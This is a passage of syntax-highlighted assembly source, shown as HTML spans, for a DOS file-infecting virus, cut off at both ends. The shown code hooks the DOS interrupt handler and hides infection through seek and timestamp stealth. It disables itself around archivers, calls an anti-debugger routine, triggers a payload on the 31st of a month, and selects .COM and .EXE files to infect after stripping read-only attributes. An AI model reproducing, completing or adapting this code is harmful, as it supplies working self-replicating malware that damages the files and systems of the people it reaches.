                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Chk_Stealth_Wr</span><span class="sc0">

</span><span class="sc5">Stealth_Seek</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_S_Seek</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Exit_S_Seek</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_S_Seek</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BP.Reg_AX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BP.Reg_DX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">Exit_S_Seek</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">JMP_RETF2_E</span><span class="sc0">

</span><span class="sc5">Chk_Stealth_Wr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write file?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Chk_Debugger</span><span class="sc0">

</span><span class="sc5">Stealth_Write</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Clean</span><span class="sc0">

</span><span class="sc5">Chk_Debugger</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B01h</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Chk_Stealth_St</span><span class="sc0">

</span><span class="sc5">Clean_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D92h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Clean_F</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Clean</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

</span><span class="sc5">Exit_Clean_F</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POPA</span><span class="sc0">

</span><span class="sc5">Chk_Stealth_St</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">; Get filedate &amp; time?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Chk_Disk_Tool</span><span class="sc0">

</span><span class="sc5">Stealth_Stamp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Get_Stamp</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_Get_Stamp</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">

</span><span class="sc5">Exit_Get_Stamp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">


</span><span class="sc5">Chk_Disk_Tool</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">                 </span><span class="sc1">; Get default DPB ?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Set_Inactive</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc0">                 </span><span class="sc1">; Get DPB ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_4_Exec</span><span class="sc0">

</span><span class="sc5">Set_Inactive</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Active_Switch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Inactive</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Active_Switch</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Check_4_Exec</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">

</span><span class="sc5">Check_4_Exec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">               </span><span class="sc1">; Program execute?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Init_Execute</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">                 </span><span class="sc1">; Open file?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Check_Infect</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6C00h</span><span class="sc0">               </span><span class="sc1">; Extended open?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Check_Infect</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                 </span><span class="sc1">; Delete file?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Check_Infect</span><span class="sc0">

</span><span class="sc5">Inactive</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">                 </span><span class="sc1">; Program terminate (PSP) ?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Enable_Stealth</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">                 </span><span class="sc1">; Terminate &amp; stay resident?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Enable_Stealth</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">                  </span><span class="sc1">; Program terminate (CS) ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Check_4_Res</span><span class="sc0">

</span><span class="sc5">Enable_Stealth</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Active_Switch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Check_4_Res</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Res_Check_AX</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Int21h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Res_Check_BX</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Return_Marker</span><span class="sc0">

</span><span class="sc5">JMP_Int21h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; JMP FAR opcode.</span><span class="sc0">
</span><span class="sc5">Int21h</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; Check if the call was made by the virus, if not, call the payload.</span><span class="sc0">
</span><span class="sc5">Return_Marker</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Exec_Host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REPE</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Caller_Is_OK</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Payload</span><span class="sc0">

</span><span class="sc5">Caller_Is_OK</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem_AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem_BX</span><span class="sc0">

                </span><span class="sc6">IRET</span><span class="sc0">


</span><span class="sc5">Init_Execute</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">                 </span><span class="sc1">; Get system-date.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">                  </span><span class="sc1">; 31st of any month?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">No_Activate</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">                 </span><span class="sc1">; Get system-time.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">                  </span><span class="sc1">; We're in the first minute?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">No_Activate</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Payload</span><span class="sc0">

</span><span class="sc5">No_Activate</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Archivers</span><span class="sc0">    </span><span class="sc1">; A known archiver is about</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Scan_Line</span><span class="sc0">               </span><span class="sc1">; to get executed?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Init_Exec</span><span class="sc0">

        </span><span class="sc1">; === Then temporarily disable stealth &amp; infection. ===</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Active_Switch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Inactive</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Active_Switch</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Exit_Init_Exec</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

</span><span class="sc5">Check_Infect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Anti_Debugger</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Hook_Int24h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6C00h</span><span class="sc0">               </span><span class="sc1">; Extended open?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_Ext</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                  </span><span class="sc1">; Then adjust register.</span><span class="sc0">

</span><span class="sc5">Check_Ext</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">Find_End_Str</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Find end of ASCIIZ-string.</span><span class="sc0">
                </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Find_End_Str</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Make_Uppercase</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Make_Uppercase</span><span class="sc0">

</span><span class="sc5">Check_Ext_COM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OC'</span><span class="sc0">                </span><span class="sc1">; .COM-extension?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_Ext_EXE</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Save_File_Attr</span><span class="sc0">

</span><span class="sc5">Check_Ext_EXE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'XE'</span><span class="sc0">                </span><span class="sc1">; .EXE-extension?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Exit_Inf</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Save_File_Attr</span><span class="sc0">

</span><span class="sc5">JMP_Exit_Inf</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Infect</span><span class="sc0">

</span><span class="sc5">Save_File_Attr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">        </span><span class="sc1">; Save filename.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Name</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">               </span><span class="sc1">; Get file-attributes.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">JMP_Exit_Inf</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Attr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">        </span><span class="sc1">; Save 'em.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Remove readonly-flag.</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">JMP_Exit_Inf</span><span class="sc0">

</span><span class="sc5">Open_Candidate</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D92h</span><span class="sc0">               </span><span class="sc1">; Open the candidate-file.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">File_Opened</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Restore_Attr</span><span class="sc0">

</span><span class="sc5">File_Opened</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Abort_Infect</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Abort_Infect</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_Header</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Abort_Infect</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Abort_Infect</span><span class="sc0">

</span><span class="sc5">Check_Min_Size</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Not_Too_Small</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">560</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Abort_Infect</span><span class="sc0">

</span><span class="sc5">Not_Too_Small</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_4_EXE</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Chk_4_Overlay</span><span class="sc0">

</span><span class="sc5">Check_COM</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Abort_Infect</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">65535</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">))</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Chk_4_Inf_Date</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Abort_Infect</span><span class="sc0">

</span><span class="sc5">Chk_4_Overlay</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Div_512_Pages</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Image_512_Pages</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Abort_Infect</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Image_Mod_512</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Abort_Infect</span><span class="sc0">

</span><span class="sc5">Check_4_NE_PE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Reloc_Table</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">; It's a possible NE/PE-file?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Chk_4_Inf_Date</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">               </span><span class="sc1">; Seek to the NE/PE-header.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EN'</span><span class="sc0">          </span><span class="sc1">; Avoid NE-files.</span><span class="sc0">
